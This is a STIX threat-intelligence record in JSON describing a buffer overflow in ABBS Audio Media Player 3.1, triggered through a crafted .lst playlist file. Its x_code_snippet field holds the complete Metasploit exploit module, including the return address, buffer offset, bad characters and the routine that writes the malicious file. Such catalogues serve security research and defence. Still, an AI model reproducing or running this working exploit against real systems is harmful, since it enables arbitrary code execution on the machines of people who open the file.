{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--89445697-c635-47fc-8fdb-c1b1d6f62191",
    "created": "2024-08-14T16:37:25.823781Z",
    "modified": "2024-08-14T16:37:25.823786Z",
    "name": "ABBS Audio Media Player .LST Buffer Overflow",
    "description": " This module exploits a buffer overflow in ABBS Audio Media Player. The vulnerability occurs when adding a specially crafted .lst file, allowing arbitrary code execution with the privileges of the user running the application. This module has been tested successfully on ABBS Audio Media Player 3.1 over Windows XP SP3 and Windows 7 SP1.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/abbs_amp_lst.rb",
            "external_id": "abbs_amp_lst.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'ABBS Audio Media Player .LST Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a buffer overflow in ABBS Audio Media Player. The vulnerability\n        occurs when adding a specially crafted .lst file, allowing arbitrary code execution with the privileges\n        of the user running the application. This module has been tested successfully on\n        ABBS Audio Media Player 3.1 over Windows XP SP3 and Windows 7 SP1.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Julian Ahrens', # Vulnerability discovery and PoC\n          'modpr0be <modpr0be[at]spentera.com>' # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'OSVDB', '75096' ],\n          [ 'EDB', '25204' ]\n        ],\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Platform'       => 'win',\n      'Payload'        =>\n        {\n          'BadChars'        => \"\\x00\\x0a\\x0d\",\n          'DisableNops'     => true,\n        },\n      'Targets'        =>\n        [\n          [ 'ABBS Audio Media Player 3.1 / Windows XP SP3 / Windows 7 SP1',\n            {\n              'Ret'     => 0x00412c91, # add esp,14 # pop # pop # pop # ret from amp.exe\n              'Offset'  => 4108,\n            }\n          ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2013-06-30',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ false, 'The file name.', 'msf.lst']),\n      ])\n\n  end\n\n  def exploit\n    buffer = payload.encoded\n    buffer << rand_text(target['Offset'] - (payload.encoded.length))\n    buffer << [target.ret].pack('V')\n\n    file_create(buffer)\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-06-30",
    "x_mitre_platforms": [
        "win'"
    ]
}